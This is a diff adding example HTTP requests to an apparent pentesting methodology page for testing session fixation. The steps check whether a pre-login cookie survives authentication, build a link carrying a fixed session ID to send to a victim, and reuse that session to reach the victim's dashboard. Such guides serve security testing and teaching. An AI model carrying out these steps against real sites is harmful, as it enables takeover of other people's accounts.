@@ -15,10 +15,30 @@ Log in to the target site and inspect the HTTP requests using Burp Suite
 
 {% step %}
 Check whether a cookie is set for us as soon as we enter the site
+
+```http
+GET / HTTP/1.1
+Host: example.com
+```
+
+Response&#x20;
+
+```http
+Set-Cookie: sessionid=ABC123XYZ; path=/; HttpOnly
+```
 {% endstep %}
 
 {% step %}
 If the cookie was set before authentication, then complete the authentication process and check whether the same cookie is set after authentication or not
+
+```http
+POST /login HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Cookie: sessionid=ABC123XYZ
+
+username=victim&password=VictimPass123
+```
 {% endstep %}
 
 {% step %}
@@ -27,14 +47,29 @@ If the same cookie was issued, the session fixation vulnerability would be confi
 
 {% step %}
 Then check if the session that is set exists in the URL parameters and in GET form
+
+```http
+GET /dashboard?sessionid=ABC123XYZ HTTP/1.1
+Host: target.com
+```
 {% endstep %}
 
 {% step %}
 Send the session to a user as a link so that a user can authenticate using that session
+
+```hurl
+http://target.com/login?sessionid=ABC123XYZ
+```
 {% endstep %}
 
 {% step %}
 Then, after the victim authenticates with the attacker's session, the attacker authenticates with the same session and gains access to the victim's panel
+
+```http
+GET /dashboard HTTP/1.1
+Host: target.com
+Cookie: sessionid=ABC123XYZ
+```
 {% endstep %}
 {% endstepper %}
 
